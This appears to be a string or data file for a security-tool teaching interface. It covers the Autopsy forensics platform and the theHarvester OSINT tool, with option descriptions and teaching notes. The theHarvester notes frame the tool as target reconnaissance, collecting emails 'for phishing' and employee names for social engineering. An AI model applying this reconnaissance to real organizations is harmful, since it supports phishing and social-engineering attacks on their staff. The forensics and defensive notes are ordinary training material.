autopsy.description: Open-source digital forensics platform. Analyzes disk images, file systems, and mobile devices. Recovers deleted files, extracts artifacts (web history, emails, documents), timestamps, and builds timelines. Used by law enforcement and incident responders worldwide.
autopsy.teach_intro: Autopsy is the GUI layer over The Sleuth Kit. When you have a disk image from a compromised system, Autopsy carves through it to find deleted files, recover artifacts, and build a timeline of activity. It's used for both offensive intelligence gathering and defensive incident response.

File Recovery.label: Deleted File Recovery
File Recovery.desc: Recover deleted files from disk images.
File Recovery.example: Open case → Add data source → Enable file recovery module
File Recovery.teach: Files are 'deleted' but the data stays on disk until overwritten. Autopsy recovers them. Deleted malware, wiped logs, erased documents — all potentially recoverable.

Web Artifacts.label: Browser History
Web Artifacts.desc: Extract browser history, downloads, cookies, cached images.
Web Artifacts.example: Open case → Run Recent Activity module
Web Artifacts.teach: Browser artifacts reveal attacker research: what sites they visited before the attack, C2 infrastructure they accessed, tools they downloaded.

Timeline.label: Timeline Analysis
Timeline.desc: Build a chronological timeline of file system activity.
Timeline.teach: Timeline shows exactly when files were created, modified, and accessed. Correlate with attack timestamps to build the kill chain narrative.

Keyword Search.label: Keyword Search
Keyword Search.desc: Search disk image for specific strings: passwords, IPs, domains.
Keyword Search.example: Open case → Keyword Search → enter terms
Keyword Search.teach: Search for C2 domains, malware hashes, victim data, or keywords from the investigation. Even encrypted files often have metadata or strings that match.

Launch GUI.desc: Launch Autopsy GUI. Create new case via interface.

autopsy.defend_notes: Forensics is the defensive side — collect and preserve evidence. Implement: centralized logging before an incident, full disk encryption complicates recovery (good for defense, bad for offense), integrity monitoring to detect unauthorized changes, and incident response plans that include immediate disk imaging before remediation.

theHarvester.name: theHarvester
theHarvester.description: OSINT gathering tool for email addresses, subdomains, IPs, URLs, and employee names. Queries search engines (Google, Bing, DuckDuckGo), social media, Shodan, VirusTotal, and dozens more. Pre-engagement recon gold.
theHarvester.teach_intro: theHarvester searches public sources for information about a target organization. Before you touch a single system, you can find email addresses (for phishing), subdomains (attack surface), employee names (social engineering), and IP ranges. All completely passive and legal.

-d.label: Target Domain
-d.teach: Your target domain is the seed. theHarvester finds everything publicly associated with it — emails, subdomains, employee names.

-b.label: Data Sources
-b.desc: Which sources to query: google, bing, shodan, virustotal, all
-b.teach: 'all' queries every available source. Individual sources: shodan finds exposed services, virustotal finds subdomains, linkedin finds employees (for social engineering).

-l.label: Result Limit
-l.teach: More results = more complete picture. 500 is a good starting point. Increase for large organizations.

-f.label: Output File
-f.desc: Save results to HTML and XML: -f output_file
-f.teach: HTML output is readable, XML is machine-parseable. Always save — you'll reference these findings throughout the engagement.

-v.label: Verify Hosts
-v.desc: Verify found hosts via DNS resolution.
-v.teach: Resolves found subdomains to confirm they're live. Dead subdomains are less interesting than live ones.

Full OSINT.desc: Query all sources, save HTML/XML report.

Quick Sweep.desc: Fast sweep of most useful sources.
